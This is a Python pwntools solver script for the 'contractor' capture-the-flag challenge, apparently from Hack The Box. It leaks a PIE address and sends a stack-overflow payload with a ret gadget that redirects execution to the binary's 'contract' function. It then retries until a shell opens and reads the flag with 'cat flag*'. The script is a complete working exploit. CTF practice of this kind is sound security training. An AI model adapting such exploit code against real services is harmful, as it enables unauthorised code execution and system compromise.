#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

# Set LOCAL to True for local testing, False for remote
LOCAL = False #True

# Clear the screen for better output visibility
os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
else:
  print(f'Running solver Remotely..\n')

# Target binary for local testing
fname = './contractor'

# Attempt counter
cnt = 1

# Infinite loop to repeatedly attempt solving
while True:
  if LOCAL:
    r = process(fname)
  else:
    IP = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
    PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
    r = remote(IP, PORT)

  # Helper function to send input after a specific prompt
  sla = lambda x, y: r.sendlineafter(x, y)

  # Load the ELF binary for function and address resolution
  e = ELF(fname)

  try:
    # Step 1: Send initial inputs to set up the exploit
    sla('> ', 'w3t')
    sla('> ', 'h4nds')
    sla('> ', '69')
    pl = 'w3th4nds' * 2
    sla('> ', pl)

    # Step 2: Leak PIE base address from the response
    r.recvuntil(pl)
    pie_leak = r.recvline().strip()
    e.address = u64(pie_leak.ljust(8, b'\x00')) - 0x1b50
    print(f'\r[*] Tries: {cnt} -> PIE base: {e.address:#04x}', end='', flush=False)

    # Step 3: Craft the payload and trigger the vulnerability
    sla('> ', '4')
    payload  = b'\x00' * 0x20
    payload += b'\x3f'
    payload += p64(e.address + 0x101a)  # ret gadget
    payload += p64(e.sym.contract)
    sla(': ', payload)

    # Step 4: Confirm and attempt to extract the flag
    sla('> ', 'Yes')
    r.sendline('cat flag*')
    flag = r.recvline_contains('HTB', timeout=0.2)

    if b'HTB' in flag:
      print(f'\n\n[+] Flag -> {flag.decode()}\n')
      r.close()
      exit()
  except EOFError as e:
    # Handle EOF errors and increment the retry counter
    cnt += 1
    r.close()
